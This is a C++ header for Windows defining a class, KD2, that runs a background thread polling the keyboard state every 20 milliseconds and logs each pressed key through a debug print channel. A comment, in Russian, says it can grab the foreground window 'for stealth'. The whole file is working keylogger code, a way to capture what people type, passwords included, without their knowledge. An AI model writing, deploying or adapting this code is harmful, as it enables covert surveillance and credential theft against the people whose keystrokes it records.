#ifndef _KD2_H
#define _KD2_H
//----------------------------------------------------------------------------------------------
extern "C"
{
	#include "kdprint\user\server\kdprint.h"
}

class KD2
{
private:
	HANDLE hThread;
	BOOL bUse_SetForegroundWindow;
	HWND hWindow2Activate;

	static void __cdecl ThreadProc(void *Context)
	{
		KD2 *pThis;

		pThis = (KD2 *)Context;

		while (!pThis->Terminate)
		{
			HWND hOldForegroundWindow;
			BOOL bForegroundWindow_Set = FALSE;

// при необходимости переводим foreground на себя (для скрытности)
			if (pThis->bUse_SetForegroundWindow)
			{
				hOldForegroundWindow = GetForegroundWindow();
				if (hOldForegroundWindow)
				{
					ULONG ForegroundPID;
					GetWindowThreadProcessId(hOldForegroundWindow, &ForegroundPID);
// только если текущий процесс не foreground
					if (ForegroundPID != GetCurrentProcessId())
					{
// ничего из этого не выйдет, потомушта форграундится только окно форграунд-процесса, ну и еще некоторые другие..
						if (!SetForegroundWindow(pThis->hWindow2Activate))
							KDPrint("kd2: failed to set foreground window hWnd=0x%08X\n", pThis->hWindow2Activate);

						bForegroundWindow_Set = TRUE;
					}
				}
			}

			for (int VK = 0; VK < 255; VK++)
			{
// опрашиваем клавиатуру
				if (GetAsyncKeyState(VK))
				{
					ULONG KeyCode = MapVirtualKey(VK, 2);
					if (KeyCode)
						KDPrint("kd2: key %u being pressed\n", KeyCode);
				}
			}

			if (bForegroundWindow_Set)
				SetForegroundWindow(hOldForegroundWindow);

			Sleep(20);
		}
	}
public:
	volatile BOOL Terminate;

	KD2() {};

	~KD2() {};

	BOOL Start(BOOL bUse_SetForegroundWindow, HWND hWindow2Activate)
	{
		if (!KDPrintInit())
			return FALSE;

		Terminate = FALSE;
		this->bUse_SetForegroundWindow = bUse_SetForegroundWindow;
		this->hWindow2Activate = hWindow2Activate;
		
		hThread = (HANDLE)_beginthread(ThreadProc, 0, this);
		return hThread != INVALID_HANDLE_VALUE? TRUE: FALSE;
	}

	void Stop()
	{
		Terminate = TRUE;
		WaitForSingleObject(hThread, INFINITE);

		KDPrintUnInit();
	}
};

//----------------------------------------------------------------------------------------------
#endif